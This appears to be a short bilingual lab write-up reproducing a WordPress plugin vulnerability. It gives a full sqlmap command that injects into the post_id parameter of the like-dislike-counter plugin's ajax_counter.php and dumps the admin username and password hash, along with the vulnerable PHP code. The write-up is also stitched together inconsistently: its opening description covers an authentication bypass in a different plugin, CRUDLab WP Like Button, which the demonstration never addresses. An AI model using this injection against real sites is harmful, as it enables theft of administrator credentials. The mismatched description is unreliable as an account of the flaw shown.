#1. Description: 
An authentication bypass vulnerability in the CRUDLab WP Like Button plugin through 1.6.0 for WordPress allows unauthenticated attackers to change settings. The contains() function in wp_like_button.php did not check if the current request is made by an authorized user, thus allowing any unauthenticated user to successfully update settings, as demonstrated by the wp-admin/admin.php?page=facebook-like-button each_page_url or code_snippet parameter.

#2. environment:
Victim-Server(Linux Ubuntu 16.04) - 192.168.0.183
Attacker(Kali Linux 2022.2) - 192.168.0.158
Wordpress version = 4.9.20


-------------------------------------------------------------------------
I used 'sqlmap' tool for implementing this vulneralbility on Kali Linux.
sqlmap이라는 툴을 사용해서 이번 취약점을 실행하였다.


$kali > sqlmap -u "http://192.168.0.183/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php" --data "post_id=1&up_type=c_like" -p post_id -D "wordpress" -T "wp_users" -C "user_login,user_pass" --dump 

##result:
Database: wordpress
Table: wp_users
[1 entry]
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$B8tw4BpNp9Zzgp/K2QlSadNSYfKmvZ1 |
+------------+------------------------------------+

I could extract admin's ID and password which is hashed.
관리자의 id와 해쉬값으로 처리된 비밀번호를 추출할 수 있었다.

-------------------------------------------------------------------------
#Cause:
var/www/html/wordpress/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php

<?php
error_reporting(0);
$changedDir='';
if (!$changedDir)$changedDir = preg_replace('|wp-content.*$|','',__FILE__);
include_once($changedDir.'/wp-config.php');
if(isset($_COOKIE['ul_post_cnt']))
{
$posts_present=$_COOKIE['ul_post_cnt'];
}
else
{
$posts_present=array();
}
$post_id=$_POST['post_id'];
$up_type=$_POST['up_type'];
if($up_type=='c_like'||$up_type=='c_dislike')
{
$for_com='c_';
}
else
{
$for_com='';
}
if(!in_array($for_com.$post_id,$posts_present))
{
update_post_ul_meta($post_id,$up_type);
}
echo get_post_ul_meta($post_id,$up_type);